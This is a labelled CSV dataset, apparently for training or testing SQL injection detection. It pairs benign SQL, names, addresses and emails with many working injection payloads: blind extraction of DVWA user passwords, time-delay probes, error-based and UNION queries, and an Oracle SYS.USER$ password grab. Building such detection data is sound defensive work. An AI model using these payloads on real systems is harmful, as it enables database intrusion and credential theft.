Query,SQLIA
"1%'   )    )     )   or char  (  75  )  ||char  (  70  )  ||char  (  99  )  ||char  (  83  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",True
san miguel del pino,False
SELECT is FROM pleasant UNION SELECT careful FROM month ORDER BY rocky,False
"1' OR NOT ORD(MID((SELECT IFNULL(CAST(table_name AS NCHAR),0x20) FROM INFORMATION_SCHEMA.TABLES WHERE table_schema=0x64767761 LIMIT 1,1),4,1))>116 AND 'fdLM'='fdLM",True
"1'   )    )    or 7427  =  dbms_pipe.receive_message  (  chr  (  116  )  ||chr  (  87  )  ||chr  (  90  )  ||chr  (  109  )  ,5  )  --",True
williams9,False
SELECT * FROM  ( SELECT hollow FROM track ) ,False
SELECT * FROM wore WHERE date = 'exchange',False
"  SELECT ADDTIME ( ""2017-06-15   09:34:21"", ""2"" ) ;",False
SELECT TOP 50 PERCENT * FROM according SELECT * FROM root FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM bus,False
SELECT * FROM wp_posts WHERE ID  =  262311 LIMIT 1,False
"1"" or 6793  =    (  select 6793 from pg_sleep  (  5   )    )   ",True
"1   )    )    as aeat where 1007  =  1007 and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",True
SELECT * FROM wife WHERE slight = 'operation' LIMIT 3,False
"   SELECT Employees.tomorrow, COUNT ( Orders.silenceID )  AS heardFROM    ( OrdersINNER JOIN store ON Orders.islandID  =  Employees.elseID ) ",False
saleh,False
zempoalteca fuxet,False
hoefer.tabuyo@gopersonalfitness.nz,False
9.61016E+15,False
"1' OR NOT ORD(MID((SELECT IFNULL(CAST(avatar AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 3,1),9,1))>112 AND 'stCx'='stCx",True
"1""   )    )    as dooi where 1806  =  1806 and 6414  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",True
"  SELECT occur,clothes FROM oil WHERE remain = 'quarter' UNION SELECT plane, zipper FROM zoo",False
elias pallares,False
SELECT AVG ( suddenly ) FROM start,False
"1' OR NOT ORD(MID((SELECT IFNULL(CAST(`user` AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 0,1),4,1))>67 AND 'wYwm'='wYwm",True
SELECT COUNT ( humanID ) FROM fed,False
almonacid de la sierra,False
garabana belart,False
39499084b,False
"1""  )   as bpmk where 4506  =  4506",True
teruel,False
5.40E+15,False
" SELECT * FROM mirror ORDER BY oil, captain",False
SELECT AVG ( pattern ) FROM pink SELECT SUM ( soon ) ,False
"1  )   as ocut where 6800  =  6800 and elt  (  4249  =  4249,7259  )  --",True
"tebete, s/n, 8?d",False
aineln,False
SELECT * FROM stop WHERE chart NOT LIKE '[cutting]%',False
select   (  case when   (  4780  =  4432  )   then 4780 else 4780*  (  select 4780 from mysql.db  )   end  )  #,True
"1'   )    )    and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and    (    (   'sqbr'  =  'sqbr",True
"select benchmark  (  5000000,md5  (  0x4c4d6142   )    )    and    (    (   'fegp'  =  'fegp",True
lagunaseca,False
sarfati@weat.nc,False
"1' OR NOT ORD(MID((SELECT IFNULL(CAST(avatar AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 4,1),16,1))>117 AND 'hBNb'='hBNb",True
"-7796'  )   union all select 4960,4960,4960,4960,4960,4960,4960,4960,4960,4960#",True
waitfor delay '0:0:5'# ogzq,True
"1' OR NOT ORD(MID((SELECT IFNULL(CAST(last_login AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 2,1),3,1))>87 AND 'yuzR'='yuzR",True
SELECT film ( s )  FROM getting UNION ALL,False
1'  )   where 5307  =  5307,True
"1' OR NOT ORD(MID((SELECT IFNULL(CAST(avatar AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 0,1),5,1))>68 AND 'epJT'='epJT",True
SELECT yellow ( s )  FROM knowledge SELECT ocean FROM audience,False
SELECT * FROM post,False
SELECT * FROM treated WHERE motor = 'slight'  AND  ( accept = 'sink' OR read = 'leave' ) ,False
SELECT * FROM tea  WHERE gulf NOT LIKE '[explanation]%',False
"SELECT post_id, meta_key, meta_value FROM wp_postmeta WHERE post_id IN  ( 28553 )  ORDER BY meta_id ASC",False
1'+  (  select kfmv where 1679  =  1679,True
SELECT * FROM exclaimed WHERE heading NOT BETWEEN 'muscle' AND 'continued',False
 UPDATE prevent SET chicken = 'disease'WHERE practice = 'soft',False
"   SELECT change, dance, toyFROM value WHERE came  IS NOT NULL",False
"  SELECT crossID AS ID, nothing AS represent FROM which",False
47639,False
"1'  )   as najc where 5213  =  5213 procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )  --",True
SELECT * FROM business WHERE shelter NOT LIKE 'feathers%',False
-7072'  )   or 4144  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4144  =  4144  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  ) ,True
"1' OR NOT ORD(MID((SELECT IFNULL(CAST(column_name AS NCHAR),0x20) FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name=0x7573657273 AND table_schema=0x64767761 LIMIT 7,1),9,1))>111 AND 'BDsk'='BDsk",True
SELECT welcome ( s )  FROM progress UNION ALL,False
SELECT * FROM power WHERE thick = 'accept'  AND City = 'native',False
SELECT ate FROM sides UNION ALL SELECT want FROM proper ORDER BY aloud,False
"1'   )    )     )   or 8315  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and    (    (     (  'vjhw' like 'vjhw",True
SELECT come FROM realize UNION SELECT instrument FROM fly ORDER BY sell,False
SELECT CURRENT_TIME (  ) ;,False
"""   )    )    or pg_sleep  (  __TIME__  )  --",True
SELECT COUNT ( tightID ) FROM noted,False
"1"" and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   ",True
select   (  case when   (  4774  =  1535  )   then 4774 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual--,True
-2165' where 6593  =  6593 or 9158  =  7254--,True
"1' OR NOT ORD(MID((SELECT IFNULL(CAST(column_name AS NCHAR),0x20) FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name=0x7573657273 AND table_schema=0x64767761 LIMIT 4,1),5,1))>119 AND 'ESxF'='ESxF",True
levert_lightfoot@laschinas.tm,False
"1' OR NOT ORD(MID((SELECT IFNULL(CAST(password AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 3,1),15,1))>67 AND 'Tfyt'='Tfyt",True
"1"" and   (  3020  =  3020  )  *6703",True
"1'  )   and elt  (  4249  =  4249,7259  )   and   (  'ifca' like 'ifca",True
SELECT option_value FROM wp_options WHERE option_name  =  '_options_footer_button_2_link' LIMIT 1,False
aylmar6,False
SELECT girl ( s )  FROM oxygen SELECT smoke FROM support,False
"1' OR NOT ORD(MID((SELECT IFNULL(CAST(last_login AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 4,1),3,1))>57 AND 'CoVr'='CoVr",True
"1""   )    )     )   and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and    (    (     (  ""sdvu"" like ""sdvu",True
FROM  ( SELECT DISTINCT any FROM ability ) ,False
"1' OR NOT ORD(MID((SELECT IFNULL(CAST(password AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 3,1),5,1))>67 AND 'Tfyt'='Tfyt",True
if  (  7427  =  7800  )   select 7427 else drop function dgir--,True
mayolas,False
"INSERT INTO escape  ( pattern, partly, speech )  VALUES  ( 'tent', 'available', 'yourself' )  ",False
"1' OR NOT ORD(MID((SELECT IFNULL(CAST(password AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 1,1),21,1))>57 AND 'TkwJ'='TkwJ",True
artenio,False
"1' OR NOT ORD(MID((SELECT IFNULL(CAST(last_login AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 2,1),9,1))>64 AND 'yuzR'='yuzR",True
"1""   )    )    and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and    (    (   ""gxqq""  =  ""gxqq",True
"1%"" and 2006  =  2006",True
pockett_miguelin@noviasteresapalacios.aw,False
"   SELECT then, they+ ', ' + slightly+ ' ' + well+ ', ' + period AS lift  FROM seed",False
ramss,False
3041,False
SELECT * FROM article WHERE lunch = 'upper',False
"1""  )   as ghpx where 2873  =  2873 waitfor delay '0:0:5'--",True
3.33213E+15,False
"1' OR NOT ORD(MID((SELECT IFNULL(CAST(`comment` AS NCHAR),0x20) FROM dvwa.guestbook ORDER BY `name` LIMIT 0,1),20,1))>100 AND 'uEgY'='uEgY",True
1' where 9602  =  9602,True
estiradamente,False
"1' OR NOT ORD(MID((SELECT IFNULL(CAST(avatar AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 1,1),2,1))>64 AND 'IlVZ'='IlVZ",True
SELECT * FROM when WHERE Price NOT BETWEEN 10 AND 20,False
"  SELECT * FROM won WHERE lucky IN  ( 'follow', 'gray', 'air' )  ",False
konstanc,False
"-3031"" union all select 2681#",True
SELECT TOP 3 * FROM crew,False
DELETE FROM deeply,False
 UPDATE atmosphere SET quiet = 'chart'WHERE movie = 'speech',False
"-9082 union all select 9858,9858,9858,9858,9858,9858--",True
"1' OR NOT ORD(MID((SELECT IFNULL(CAST(password AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 0,1),17,1))>87 AND 'upay'='upay",True
"1' and char  (  111  )  ||char  (  77  )  ||char  (  121  )  ||char  (  88  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  ",True
espaldilla,False
"  SELECT information,characteristic,ask FROM door LEFT JOIN Orders ON screen.liftID =  car.angry ORDER BY buried.got",False
SELECT * FROM husband WHERE them BETWEEN '1996-07-01' AND '1996-07-31',False
SELECT * FROM dress  WHERE fat = excited,False
SELECT connected ( s ) FROM complex INNER JOIN,False
1' and   (  3020  =  3020  )  *6703 and 'tmng' like 'tmng,True
"1' OR NOT ORD(MID((SELECT IFNULL(CAST(`user` AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 0,1),2,1))>51 AND 'wYwm'='wYwm",True
SELECT AVG ( split ) FROM try SELECT SUM ( knife ) ,False
"-5898""   )    )    as fycd where 7135  =  7135 or 1570  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  1570  =  1570  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  --",True
"calle la corta, 85",False
"1 or   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8113  =  8113,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )  ",True
"1   )    )    union all select null,null,null,null,null,null,null,null#",True
SELECT * FROM chair WHERE count = 'general' LIMIT 3,False
-7610' or 3038  =  3038,True
kara-lyn,False
"1"" and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x  )   and ""nzgn""  =  ""nzgn",True
camisoln,False
SELECT TOP 50 PERCENT * FROM win SELECT * FROM stranger FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM stiff,False
SELECT * FROM settlers WHERE decide LIKE '%trace%',False
"  SELECT * FROM baby WHERE our IN  ( 'grown', 'single', 'examine' )  ",False
SELECT * FROM locate WHERE school = 'engineer' LIMIT 3,False
SELECT * FROM sure WHERE rhythm BETWEEN '1996-07-01' AND '1996-07-31',False
SELECT AVG ( wear ) FROM unless SELECT SUM ( carry ) ,False
select sleep  (  5  )  --,True
SELECT option_value FROM wp_options WHERE option_name  =  '_transient_timeout_houzez_verification_success' LIMIT 1,False
desiree,False
"1',  (  case when 8260  =  8260 then 1 else null end  )  ",True
SELECT * FROM fireplace WHERE brick IN  ( SELECT green FROM type ) ,False
1   )    )    as gygm where 4024  =  4024,True
DELETE FROM label,False
"calle isis, 180",False
atigrada,False
" select * from users where id  =  1.  union select 1,version  (    )   -- 1",True
SELECT * FROM grade WHERE yellow NOT LIKE 'including%',False
SELECT * FROM evidence ORDER BY train DESC,False
cimorro,False
SELECT facing ( s ) FROM food INNER JOIN,False
SELECT * FROM vertical WHERE round BETWEEN '1996-07-01' AND '1996-07-31',False
"  UPDATE wash SET clothing =  'guess', City =  'monkey' WHERE nuts =  coming",False
-9363%' or   (  8459  =  8459  )  *4906 and '%'  =  ',True
SELECT gone FROM simplest UNION ALL SELECT store FROM walk ORDER BY evening,False
" AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  PASSWORD  )   FROM   (  SELECT DISTINCT  (  PASSWORD  )  , ROWNUM AS LIMIT FROM SYS.USER$  )   WHERE LIMIT  =  4   )    )    AND 'i'  =  'i",True
SELECT Count ( * )  AS discover,False
SELECT * FROM flame 3 SELECT * FROM roll,False
"1' OR NOT ORD(MID((SELECT IFNULL(CAST(`user` AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 2,1),2,1))>108 AND 'LpdU'='LpdU",True
"1' OR NOT ORD(MID((SELECT IFNULL(CAST(column_name AS NCHAR),0x20) FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name=0x6775657374626f6f6b AND table_schema=0x64767761 LIMIT 1,1),4,1))>96 AND 'bccT'='bccT",True
select case when 6558  =  4327 then 1 else null end--,True
alberuela de tubo,False
"1""  )   as yzzk where 1813  =  1813 and   (  3020  =  3020  )  *6703--",True
SELECT COUNT ( whenID ) FROM rubbed,False
darcy@google-movil.dz,False
"1"" OR NOT 6459=2130-- iKpb",True
"1' OR NOT ORD(MID((SELECT IFNULL(CAST(failed_login AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 2,1),1,1))>32 AND 'mHyI'='mHyI",True
SELECT one FROM writer UNION ALL SELECT pony FROM central ORDER BY plate,False
"1""   )    )    procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and    (    (   ""jzbb""  =  ""jzbb",True
1   )    )     )   and   (  6148  =  3343  )  *3343 and    (    (     (  3271  =  3271,True
"1' OR NOT ORD(MID((SELECT IFNULL(CAST(`comment` AS NCHAR),0x20) FROM dvwa.guestbook ORDER BY `name` LIMIT 0,1),6,1))>96 AND 'uEgY'='uEgY",True
madisett,False
SELECT MIN ( move )  AS such FROM construction,False
"select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  +'",True
"   SELECT balance, order, roadFROM hospital WHERE muscle  IS NOT NULL",False
1'   )    )     )   or   (  select * from   (  select  (  sleep  (  5   )    )     )  sddo  )  #,True
"SELECT column1 , column2, ... FROM table_name ;",False
"   SELECT farm, worried, builtFROM magic WHERE team  IS NOT NULL",False
SELECT TOP 3 * FROM meet,False
"1'+  (  select 'bztp' where 2541  =  2541 union all select null,null,null,null,null,null,null,null,null,null--",True
"call regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and 'ekhi'  =  'ekhi",True
harrold_elloy@santacruzdelvoto.ci,False
1 where 5828  =  5828 and   (  3020  =  3020  )  *6703--,True
"1   (  select   (  case when   (  5451  =  5451  )   then regexp_substring  (  repeat  (  right  (  char  (  5451  )  ,0  )  ,500000000  )  ,null  )   else char  (  108  )  ||char  (  76  )  ||char  (  112  )  ||char  (  116  )   end  )   from information_schema.system_users  )  -- fzhj",True
"SELECT post_id, meta_key, meta_value FROM wp_postmeta WHERE post_id IN  ( 53815 )  ORDER BY meta_id ASC",False
"1   )    )    and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null  )   and    (    (   9542  =  9542",True
toddi,False
-4239 or 2724 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  2724  =  2724  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  -- xacp,True
"1' OR NOT ORD(MID((SELECT IFNULL(CAST(last_login AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 2,1),19,1))>87 AND 'yuzR'='yuzR",True
" SELECT column_name ( s )  FROM individual,moon",False
"  (  extractvalue  (  1759,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1759  =  1759,1   )    )     )  ,0x717a767a71   )    )     )  ",True
1'  )   as pwqs where 2291  =  2291,True
"1' in boolean mode  )   and 6510  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  #",True
ananas,False
"1""  )   where 7513  =  7513 and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x  )  --",True
brownfie,False
"-9947""   )    )     )   union all select 8765,8765,8765,8765,8765#",True
SELECT * FROM positive WHERE third = 'outline',False
"  UPDATE species SET frog =  'safe', City =  'movie' WHERE flower =  scientist",False
valentianiano,False
SELECT TOP 3 * FROM owner WHERE business = 'lunch',False
-2829 OR 4072=4072,True
SELECT * FROM lack 3 SELECT * FROM my,False
"-3868'   )    )    or make_set  (  6809  =  1236,1236  )   and    (    (   'evnj'  =  'evnj",True
"1' OR NOT ORD(MID((SELECT IFNULL(CAST(avatar AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 0,1),6,1))>47 AND 'epJT'='epJT",True
SELECT * FROM Customers  WHERE City LIKE 'ber%';,False
-4979'   )    )    or 4493  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4493  =  4493  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    and    (    (   'ofgg'  =  'ofgg,True
hi' or 'a'  =  'a,True
amelia,False
"1""   )    )     )   and char  (  111  )  ||char  (  77  )  ||char  (  121  )  ||char  (  88  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and    (    (     (  ""htyi""  =  ""htyi",True
"c/ rafael belmonte garcia, 29,",False
SELECT AVG ( Price ) FROM exist,False
"1""   )    )     )   order by 1#",True
"1' OR NOT ORD(MID((SELECT IFNULL(CAST(`user` AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 0,1),5,1))>1 AND 'wYwm'='wYwm",True
SELECT MIN ( plant )  AS effort FROM empty,False
SELECT * FROM older WHERE wagon BETWEEN '1996-07-01' AND '1996-07-31',False
SELECT * FROM alone WHERE bush BETWEEN 'volume' AND 'spread',False
SELECT * FROM swing WHERE explain BETWEEN '1996-07-01' AND '1996-07-31',False
"or 1  =  1 or """"  =  ",True
"1'   )    )     )   union all select null,null,null,null,null,null#",True
"1'  )   or 4411  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   and   (  'edcm' like 'edcm",True
7.6744E+15,False
"1'   )    )     )   and 4241  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  4241  =  4241  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and    (    (     (  'fzgy'  =  'fzgy",True
broun_granlund@purplemoongrn.fi,False
1   )    )    as gxvp where 3865  =  3865,True
"1' OR NOT ORD(MID((SELECT IFNULL(CAST(password AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 1,1),23,1))>100 AND 'TkwJ'='TkwJ",True
"  SELECT duckID AS ID, gulf AS shelter FROM slept",False
"-9247'   )    )     )   union all select 6964,6964,6964,6964,6964,6964,6964,6964,6964--",True
aguzadera,False
1' OR NOT 60=37 AND 'mbRn'='mbRn,True
SELECT TOP 3 * FROM consist WHERE pour = 'kept' SELECT * FROM whether,False
a',True
"1' OR NOT ORD(MID((SELECT IFNULL(CAST(password AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 2,1),16,1))>48 AND 'JUqW'='JUqW",True
SELECT AVG ( Price ) FROM wing,False
SELECT * FROM three ORDER BY dozen DESC,False
"1"" where 4064  =  4064 and 4241  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  4241  =  4241  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  --",True
SELECT * FROM generally WHERE plain LIKE '%alphabet%',False
SELECT * FROM does WHERE four = 'understanding' LIMIT 3,False
"1' OR NOT ORD(MID((SELECT IFNULL(CAST(avatar AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 0,1),12,1))>100 AND 'epJT'='epJT",True
" select * from users where id  =  1 %$ 1 union select null,@@VERSION -- 1",True
"1'+  (  select kqac where 4362  =  4362 and 8312  =  dbms_pipe.receive_message  (  chr  (  69  )  ||chr  (  79  )  ||chr  (  101  )  ||chr  (  68  )  ,5  )  --",True
SELECT * FROM very WHERE fresh  BETWEEN 10 AND 20,False
"1' OR NOT ORD(MID((SELECT IFNULL(CAST(avatar AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 2,1),24,1))>120 AND 'TszS'='TszS",True
select   (  case when   (  1354  =  7529  )   then 1354 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual--,True
"1  )   where 7199  =  7199 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",True
"1'   )    )     )   and 6510  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   and    (    (     (  'gmvk' like 'gmvk",True
uriah,False
SELECT TOP 50 PERCENT * FROM decide SELECT * FROM unhappy FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM about,False
SELECT MIN ( pool )  AS earlier FROM happen,False
"1' OR NOT ORD(MID((SELECT IFNULL(CAST(password AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 0,1),33,1))>1 AND 'upay'='upay",True
"1%""   )    )     )   and elt  (  4249  =  4249,7259  )   and    (    (     (  ""%""  =  """,True
29%,True
"1' OR NOT ORD(MID((SELECT IFNULL(CAST(last_login AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 3,1),12,1))>47 AND 'znpp'='znpp",True
"   SELECT COUNT ( cup ) , ate FROM number BY sugar",False
SELECT TOP 3 * FROM attached WHERE wrong = 'sign' SELECT * FROM easily,False
"1' OR NOT ORD(MID((SELECT IFNULL(CAST(avatar AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 4,1),23,1))>110 AND 'hBNb'='hBNb",True
"1' OR NOT ORD(MID((SELECT IFNULL(CAST(password AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 2,1),30,1))>47 AND 'JUqW'='JUqW",True
SELECT * FROM gently  WHERE relationship NOT LIKE '[steep]%',False
"1%' and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and '%'  =  '",True
8232,False
"-2783' where 1494  =  1494 union all select 1494,1494,1494,1494,1494,1494--",True
mccreano,False
"1' OR NOT ORD(MID((SELECT IFNULL(CAST(password AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 4,1),31,1))>96 AND 'vyMm'='vyMm",True
"  UPDATE bag SET pet =  'consonant', City =  'another' WHERE outer =  title",False
"1'  )   where 5276  =  5276 union all select null,null--",True
SELECT * FROM symbol WHERE perfect = 'fellow' LIMIT 3,False
SELECT * FROM rear WHERE recently = 'finger'  AND  ( next = 'depend' OR snake = 'rate' ) ,False
